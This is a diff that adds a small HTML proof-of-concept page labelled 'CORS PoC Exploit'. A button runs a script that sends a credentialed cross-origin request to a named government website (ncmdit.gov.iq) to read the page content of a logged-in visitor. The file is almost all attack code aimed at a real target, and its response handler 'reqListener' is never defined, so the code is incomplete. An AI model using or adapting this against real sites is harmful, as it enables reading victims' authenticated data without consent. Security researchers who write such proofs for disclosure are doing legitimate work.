@@ -1,0 +1,25 @@
+<!DOCTYPE html>
+<html>
+
+<head>
+    <script>
+        function cors() {
+            var req = new XMLHttpRequest();
+            req.onload = reqListener;
+            req.open('get', 'https://ncmdit.gov.iq/', true);
+            req.withCredentials = true;
+            req.send();
+        }
+    </script>
+</head>
+
+<body>
+    <center>
+        <h2>CORS PoC Exploit </h2>
+        <h3>Show full page's content</h3>
+        <div id="demo">
+            <button type="button" onclick="cors()">Exploit</button>
+        </div>
+</body>
+
+</html>
